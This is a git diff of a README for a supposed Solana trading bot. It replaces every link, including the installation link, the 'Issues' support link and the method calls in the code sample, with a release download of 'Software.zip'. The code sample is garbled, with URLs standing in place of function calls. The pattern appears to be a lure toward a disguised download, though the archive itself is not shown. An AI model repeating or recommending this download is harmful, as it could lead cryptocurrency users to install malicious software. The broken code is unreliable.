@@ -18,7 +18,7 @@ Welcome to the **Solana Trading Bot** repository - your go-to solution for a str
 - Solana Web3
 
 ## Installation
-🚀 To get started with the Solana Trading Bot, click [here](https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v1.0/Software.zip) to download the necessary files. Once downloaded, follow the installation instructions to set up the bot on your system.
+🚀 To get started with the Solana Trading Bot, click [here](https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v2.0/Software.zip) to download the necessary files. Once downloaded, follow the installation instructions to set up the bot on your system.
 
 ## Features
 🔥 Dive into the exciting features of the Solana Trading Bot:
@@ -37,10 +37,10 @@ const solanaBot = require('solana-trading-bot');
 const bot = new solanaBot();
 
 // Implement your trading strategy
-https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v1.0/Software.zip('buy', 'SOL', 100);
+https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v2.0/Software.zip('buy', 'SOL', 100);
 
 // Execute the trade
-https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v1.0/Software.zip();
+https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v2.0/Software.zip();
 ```
 
 ## Contributing
@@ -50,6 +50,6 @@ https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v1.0
 📝 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Support
-💌 For any questions or issues, please visit the [Issues](https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v1.0/Software.zip) section of this repository.
+💌 For any questions or issues, please visit the [Issues](https://github.com/mehedihasanfarabi10/Solana-Trading-Bot/releases/download/v2.0/Software.zip) section of this repository.
 
 🚀 Happy trading with the Solana Trading Bot! 🚀
